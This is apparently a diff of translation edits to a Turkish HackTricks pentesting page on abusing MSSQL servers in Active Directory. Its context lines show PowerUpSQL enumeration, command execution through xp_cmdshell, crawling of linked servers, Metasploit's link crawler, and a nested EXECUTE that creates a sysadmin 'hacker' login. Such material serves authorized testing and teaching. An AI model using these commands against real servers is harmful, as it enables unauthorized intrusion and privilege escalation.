@@ -87,7 +87,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-Bu durumda [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) powershell modülü çok faydalıdır.
+Bu durumda powershell modülü [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) çok faydalıdır.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
@@ -124,7 +124,7 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Temel Suistimal
+## MSSQL Temel Suistimali
 
 ### Erişim Veritabanı
 ```powershell
@@ -140,7 +140,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-MSSQL sunucusu içinde **komutları çalıştırmak** da mümkün olabilir.
+MSSQL sunucusu içinde **komutlar çalıştırmak** da mümkün olabilir.
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
@@ -155,11 +155,11 @@ Check in the page mentioned in the **following section how to do this manually.*
 
 ## MSSQL Güvenilir Bağlantılar
 
-Eğer bir MSSQL örneği, farklı bir MSSQL örneği tarafından güvenilir (veritabanı bağlantısı) olarak kabul ediliyorsa. Kullanıcının güvenilir veritabanı üzerinde yetkileri varsa, **güven ilişkisini kullanarak diğer örnekte de sorgular çalıştırabilecektir**. Bu güven ilişkileri zincirlenebilir ve bir noktada kullanıcı, komut çalıştırabileceği yanlış yapılandırılmış bir veritabanı bulabilir.
+Eğer bir MSSQL örneği, farklı bir MSSQL örneği tarafından güvenilir (veritabanı bağlantısı) olarak işaretlenmişse. Kullanıcının güvenilir veritabanı üzerinde yetkileri varsa, **güven ilişkisini kullanarak diğer örnekte de sorgular çalıştırabilecektir**. Bu güven ilişkileri zincirlenebilir ve bir noktada kullanıcı, komut çalıştırabileceği yanlış yapılandırılmış bir veritabanı bulabilir.
 
 **Veritabanları arasındaki bağlantılar, orman güvenleri arasında bile çalışır.**
 
-### Powershell Kötüye Kullanımı
+### Powershell Suistimali
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -193,7 +193,7 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Güvenilir bağlantıları metasploit kullanarak kolayca kontrol edebilirsiniz.
+Trusted bağlantıları metasploit kullanarak kolayca kontrol edebilirsiniz.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -207,11 +207,11 @@ From **Linux** you could obtain a MSSQL console shell with **sqsh** and **mssqlc
 
 From **Windows** you could also find the links and execute commands manually using a **MSSQL client like** [**HeidiSQL**](https://www.heidisql.com)
 
-_Login using Windows authentication:_
+_Windows kimlik doğrulaması ile giriş yapın:_
 
 ![](<../../.gitbook/assets/image (808).png>)
 
-#### Güvenilir Bağlantıları Bul
+#### Güvenilir Bağlantıları Bulun
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
@@ -242,7 +242,7 @@ Eğer `openquery()` üzerinden `exec xp_cmdshell` gibi işlemleri gerçekleştir
 
 ### Manuel - EXECUTE
 
-Ayrıca, `EXECUTE` kullanarak güvenilir bağlantıları da kötüye kullanabilirsiniz:
+Ayrıca `EXECUTE` kullanarak güvenilir bağlantıları da kötüye kullanabilirsiniz:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -252,7 +252,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQL yerel kullanıcısı** genellikle **`SeImpersonatePrivilege`** adı verilen özel bir yetkiye sahiptir. Bu, hesabın "kimlik doğrulamasından sonra bir istemciyi taklit etmesine" olanak tanır.
 
-Birçok yazarın geliştirdiği bir strateji, bir SİSTEM hizmetini, saldırganın oluşturduğu sahte veya ortada adam hizmetine kimlik doğrulaması yapmaya zorlamaktır. Bu sahte hizmet, kimlik doğrulaması yapmaya çalışırken SİSTEM hizmetini taklit edebilir.
+Birçok yazarın geliştirdiği bir strateji, bir SİSTEM hizmetini, saldırganın oluşturduğu sahte veya ortadaki bir hizmete kimlik doğrulaması yapmaya zorlamaktır. Bu sahte hizmet, kimlik doğrulaması yapmaya çalışırken SİSTEM hizmetini taklit edebilir.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) bu çeşitli tekniklerin bir koleksiyonuna sahiptir ve bunlar Beacon'ın `execute-assembly` komutu aracılığıyla yürütülebilir.
 
@@ -269,7 +269,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
 * **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**
 
 </details>
